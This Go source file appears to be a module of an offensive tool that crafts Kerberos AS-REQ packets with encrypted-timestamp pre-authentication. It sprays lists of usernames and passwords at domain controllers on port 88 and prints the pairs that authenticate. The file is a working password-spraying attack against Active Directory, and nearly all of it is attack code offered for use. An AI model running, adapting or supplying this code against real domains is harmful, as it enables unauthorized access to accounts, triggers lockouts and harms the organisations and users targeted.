package main

import (
	"crypto/hmac"
	"crypto/md5"
	"crypto/rc4"
	"encoding/asn1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"golang.org/x/crypto/md4"
	"log"
	"math/rand"
	"net"
	"strconv"
	"strings"
	"sync"
	"time"
)

type AS_REQ_RESP_STRUCT struct {
	PVNO  asn_resp_pvno `asn1:"tag:0,implicit,optional"`
	MSG_TYPE asn_resp_msg_type `asn1:"tag:1,implicit,optional"`
	STIME asn_resp_stime `asn1:"tag:4,implicit"`
	SUSEC  asn_resp_susec `asn1:"tag:5,implicit,optional"`
	ERROR_CODE  asn_resp_error_code `asn1:"tag:6,implicit,optional"`
	REALM  asn_resp_realm `asn1:"tag:9,implicit,optional"`
	SNAME []asn_resp_sname `asn1:"tag:10,implicit"`
	E_DATA asn_resp_e_data `asn1:"tag:12,implicit,optional"`
}

type asn_resp_pvno struct {
	Item int
}
type asn_resp_msg_type struct {
	Item int
}
type asn_resp_stime struct {
	Item asn1.RawValue
}
type asn_resp_susec struct {
	Item int
}
type asn_resp_error_code struct {
	Item int
}
type asn_resp_realm struct {
	Item asn1.RawValue
}
type asn_resp_sname struct {
	Item0 asn_name_type `asn1:"tag:0,implicit,optional"`
	Item1 asn_resp_sname_strings `asn1:"tag:1,implicit,optional"`
}
type asn_name_type struct {
	Item int
}

type asn_resp_sname_strings struct {
	Items []asn1.RawValue
}
type asn_resp_e_data struct {
	Item []byte
}

type AS_REQ_STRUCT_WITH_PRE_AUTH struct {
	PVNO  asn_pvno_with_pre_auth `asn1:"tag:1,implicit,optional"`
	MSG_TYPE asn_msg_type_with_pre_auth `asn1:"tag:2,implicit,optional"`
	PADATA asn_padata_with_pre_auth `asn1:"tag:3,implicit"`
	REQ_BODY []asn_req_body_with_pre_auth `asn1:"tag:4,implicit"`
}

type asn_pvno_with_pre_auth struct {
	Item int
}
type asn_msg_type_with_pre_auth struct {
	Item int
}
type asn_padata_with_pre_auth struct {
	Items []asn_pa_data_with_pre_auth
}
type asn_pa_data_with_pre_auth struct {
	Padatatype int `asn1:"tag:1,explicit"`
	Padatavalue []byte `asn1:"tag:2,explicit"`
}



func FromASCIIString(in string) []byte {
	var u16 []byte
	for _, b := range []byte(in) {
		u16 = append(u16, b)
		u16 = append(u16, 0x00)
	}
	mdfour := md4.New()
	mdfour.Write(u16)
	return mdfour.Sum(nil)
}

func FromASCIIStringToHex(in string) string {
	b := FromASCIIString(in)
	return hex.EncodeToString(b)
}

type AS_REQ_STRUCT_FOR_ENCRYPTED_TIMESTAMP struct {
	TIMESTAMP []asn1.RawValue `asn1:"tag:0"`
}

type asn_req_body_with_pre_auth struct {
	Item0 asn_kdc_options_with_pre_auth `asn1:"tag:0,implicit,optional"`
	Item1 []asn_cname_with_pre_auth `asn1:"tag:1,implicit,optional"`
	Item2 asn_realm_with_pre_auth `asn1:"tag:2,implicit,optional"`
	Item3 []asn_sname_with_pre_auth `asn1:"tag:3,implicit,optional"`
	Item5 asn_till_with_pre_auth `asn1:"tag:5,implicit,optional"`
	Item6 asn_rtime_with_pre_auth `asn1:"tag:6,implicit,optional"`
	Item7 asn_nonce_with_pre_auth `asn1:"tag:7,implicit,optional"`
	Item8 []asn_etype_with_pre_auth `asn1:"tag:8,implicit,optional"`
	Item9 asn_addresses_with_pre_auth `asn1:"tag:9,implicit,optional"`
}
type asn_kdc_options_with_pre_auth struct {
	Item asn1.BitString
}
type asn_cname_with_pre_auth struct {
	Item0 asn_name_type_with_pre_auth `asn1:"tag:0,implicit,optional"`
	Item1 []asn_cname_string_with_pre_auth `asn1:"tag:1,implicit,optional"`
}
type asn_name_type_with_pre_auth struct {
	Item int
}
type asn_cname_string_with_pre_auth struct {
	Item asn1.RawValue
}
type asn_realm_with_pre_auth struct {
	Item asn1.RawValue
}
type asn_sname_with_pre_auth struct {
	Item0 asn_name_type_with_pre_auth `asn1:"tag:0,implicit,optional"`
	Item1 asn_sname_string_with_pre_auth `asn1:"tag:1,implicit,optional"`
}
type asn_sname_string_with_pre_auth struct {
	Items []asn1.RawValue
}
type asn_till_with_pre_auth struct {
	Item asn1.RawValue
}
type asn_rtime_with_pre_auth struct {
	Item asn1.RawValue
}
type asn_nonce_with_pre_auth struct {
	Item int
}
type asn_etype_with_pre_auth struct {
	Item0 int
	Item1 int
	Item2 int
	Item3 int
	Item4 int
	Item5 int
}
type asn_addresses_with_pre_auth struct {
	Items []asn_hostaddress_with_pre_auth
}
type asn_hostaddress_with_pre_auth struct {
	Item0 asn_addr_type_with_pre_auth `asn1:"tag:0,implicit,optional"`
	Item1 asn_netbios_name_with_pre_auth `asn1:"tag:1,implicit,optional"`
}
type asn_addr_type_with_pre_auth struct {
	Item int
}
type asn_netbios_name_with_pre_auth struct {
	Item []byte
}

type TEMP_STRUCT struct {
	ETYPE TEMP_STRUCT_ETYPE `asn1:"tag:0,implicit,optional"`
	CIPHER []byte `asn1:"tag:2,explicit,optional"`
}
type TEMP_STRUCT_ETYPE struct {
	Item int
}

type TEMP_STRUCTB struct {
	Item bool `asn1:"tag:0,explicit,optional"`
}

func sendReqWithPreAuthASN(connect net.Conn,account string, password string,domain string) bool {
	var as_req AS_REQ_STRUCT_WITH_PRE_AUTH
	as_req.PVNO = asn_pvno_with_pre_auth{5}
	as_req.MSG_TYPE = asn_msg_type_with_pre_auth{10}
	padatatype := 2

	var tempA TEMP_STRUCT
	tempA.ETYPE = TEMP_STRUCT_ETYPE{23}


	currentTimestamp := time.Now().UTC().Format("20060102150405")
	currentTimestamp = currentTimestamp+"Z"
	ntlmHash := FromASCIIStringToHex(password)


	temp22 := make([]asn1.RawValue,1)
	currentTimestampForEncryption := AS_REQ_STRUCT_FOR_ENCRYPTED_TIMESTAMP{temp22}

	currentTimestampForEncryption.TIMESTAMP[0] = asn1.RawValue{Tag: asn1.TagGeneralizedTime, Bytes: []byte(currentTimestamp)}
	tt,_ := asn1.Marshal(currentTimestampForEncryption)


	str1 := hex.EncodeToString(tt)

	ntlm := ntlmHash
	key, _ := hex.DecodeString(ntlm)
	dataToEncrypt, _ := hex.DecodeString(str1)
	confounder := make([]byte, 8)
	rand.Read(confounder)
	cls_usage_str,_:= hex.DecodeString("01000000")
	ki := hmac.New(md5.New, key)
	ki.Write(cls_usage_str)
	cksum := hmac.New(md5.New, ki.Sum(nil))
	payload := append(confounder,dataToEncrypt...)
	cksum.Write(payload)
	cksumString := hex.EncodeToString(cksum.Sum(nil))
	ke := hmac.New(md5.New, ki.Sum(nil))
	ke.Write(cksum.Sum(nil))
	c, err := rc4.NewCipher(ke.Sum(nil))
	if err != nil {
		log.Fatalln(err)
	}
	src := payload
	dst := make([]byte, len(src))
	c.XORKeyStream(dst, src)
	totalResult := cksumString+hex.EncodeToString(dst)
	raw_data := totalResult
	data_data, _ := hex.DecodeString(raw_data)
	tempA.CIPHER = data_data
	mdata, _ := asn1.Marshal(tempA)


	temp := make([]asn_pa_data_with_pre_auth,2)
	as_req.PADATA.Items = temp
	as_req.PADATA.Items[0].Padatatype = padatatype
	as_req.PADATA.Items[0].Padatavalue = mdata


	padatatype2 := 128
	var tempB TEMP_STRUCTB
	tempB.Item = true

	mdataB, _ := asn1.Marshal(tempB)
	as_req.PADATA.Items[1].Padatatype = padatatype2
	as_req.PADATA.Items[1].Padatavalue = mdataB

	raw_kdcoptions := "40810010"
	data_kdcoptions, _ := hex.DecodeString(raw_kdcoptions)

	temp2 := make([]asn_req_body_with_pre_auth,1)
	as_req.REQ_BODY = temp2
	as_req.REQ_BODY[0].Item0.Item = asn1.BitString{
		Bytes:     data_kdcoptions,
		BitLength: 32,
	}

	temp3 := make([]asn_cname_with_pre_auth,1)
	temp3[0].Item0 = asn_name_type_with_pre_auth{1}
	temp4 := make([]asn_cname_string_with_pre_auth,1)
	temp4[0].Item = asn1.RawValue{Tag: asn1.TagGeneralString, Bytes: []byte(account)}
	temp3[0].Item1 = temp4
	as_req.REQ_BODY[0].Item1 = temp3
	as_req.REQ_BODY[0].Item2 = asn_realm_with_pre_auth{Item: asn1.RawValue{Tag: asn1.TagGeneralString, Bytes: []byte(domain)}}

	temp5 := make([]asn_sname_with_pre_auth,1)
	temp5[0].Item0 = asn_name_type_with_pre_auth{2}
	var temp6 asn_sname_string_with_pre_auth
	temp6.Items = make([]asn1.RawValue,2)
	temp6.Items[0] = asn1.RawValue{Tag: asn1.TagGeneralString, Bytes: []byte("krbtgt")}
	temp6.Items[1] = asn1.RawValue{Tag: asn1.TagGeneralString, Bytes: []byte(domain)}
	temp5[0].Item1 = temp6
	as_req.REQ_BODY[0].Item3 = temp5

	tilldate := "20370913024805Z"
	rtimedate := "20370913024805Z"
	as_req.REQ_BODY[0].Item5 = asn_till_with_pre_auth{Item: asn1.RawValue{Tag: asn1.TagGeneralizedTime, Bytes: []byte(tilldate)}}
	as_req.REQ_BODY[0].Item6 = asn_rtime_with_pre_auth{Item: asn1.RawValue{Tag: asn1.TagGeneralizedTime, Bytes: []byte(rtimedate)}}
	as_req.REQ_BODY[0].Item7 = asn_nonce_with_pre_auth{183454254}

	temp7 := make([]asn_etype_with_pre_auth,1)
	temp7[0].Item0 = 18
	temp7[0].Item1 = 17
	temp7[0].Item2 = 23
	temp7[0].Item3 = 24
	temp7[0].Item4 = -135
	temp7[0].Item5 = 3
	as_req.REQ_BODY[0].Item8 = temp7

	temp8 := asn_addresses_with_pre_auth{}
	temp9 := make([]asn_hostaddress_with_pre_auth,1)
	temp9[0].Item0 = asn_addr_type_with_pre_auth{20}

	netBiosName := "CLIENT1" // hardcoded machine name
	netBiosNameLen := len(netBiosName)
	padding := 16-netBiosNameLen
	for i:=0;i<padding;i++ {
		netBiosName = netBiosName+" " // Padding might be different https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-brws/0c773bdd-78e2-4d8b-8b3d-b7506849847b
	}

	temp9[0].Item1 = asn_netbios_name_with_pre_auth{[]byte(netBiosName)}
	temp8.Items = temp9
	as_req.REQ_BODY[0].Item9 = temp8

	mdata, _ = asn1.MarshalWithParams(as_req,"application,explicit,tag:10")

	str := hex.EncodeToString(mdata)

	messageLen := uint32(len(str)/2)
	bs := make([]byte, 4)
	binary.BigEndian.PutUint32(bs, messageLen)

	data,_ := hex.DecodeString(str)

	data = append(bs,data...)
	connect.Write(data)
	recvBuf := make([]byte, 1024)

	n, err := connect.Read(recvBuf[:]) // recv data
	if err != nil {
		if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
			log.Println("read timeout:", err)
		} else {
			log.Println("read error:", err)
		}
	}
	h2 := fmt.Sprintf("%x", recvBuf)
	res := parseAsReqResp(h2[:n*2])
	return res
}

func parseAsReqResp(resp string) bool {
	resp = resp[8:]
	data, _ := hex.DecodeString(resp)
	var n AS_REQ_RESP_STRUCT
	_, _ = asn1.UnmarshalWithParams(data, &n,"application,explicit,tag:30")
	if n.ERROR_CODE.Item == 6 {
		//fmt.Println("Principal Unknown")
		return false
	} else if n.ERROR_CODE.Item == 25 {
		//fmt.Println("Pre-Auth Required")
		return false
	} else if n.ERROR_CODE.Item == 24 {
		//fmt.Println("Pre-Auth Failed")
		return false
	} else if n.ERROR_CODE.Item == 18 {
		//fmt.Println("User Locked")
		return false
	}
	return true
}

func connectKerberos(targetServer string, targetPort int) net.Conn {
	conn, _ := net.Dial("tcp", targetServer+":"+strconv.Itoa(targetPort))
	return conn
}

func kerberosSpray(wg *sync.WaitGroup, channelToCommunicate chan string,  taskToRun task, storeResult *int) {
	defer wg.Done()
	internalCounter := 0
	for _,taskTarget := range taskToRun.targetsRaw {
		taskTargetSlice := strings.Split(taskTarget,".")
		targetRealm := taskTargetSlice[0]
		temporaryTarget := parseTarget(taskTarget)
		taskToRun.target = temporaryTarget
		if taskToRun.target.port == 0 {
			taskToRun.target.port = 88
		}
		for _,password := range taskToRun.passwords {
			for _,username := range taskToRun.usernames {
				if internalCounter >= *storeResult {

					myConnect := connectKerberos(temporaryTarget.host,temporaryTarget.port)
					result := sendReqWithPreAuthASN(myConnect,username,password,targetRealm)

					if result == false {
						fmt.Print("-")
					} else {
						fmt.Print("+")
						channelToCommunicate <- taskToRun.target.host + ":" + username+":"+password
					}
					myConnect.Close()
					*storeResult++
				} else {

				}
				internalCounter++
			}
		}
	}
}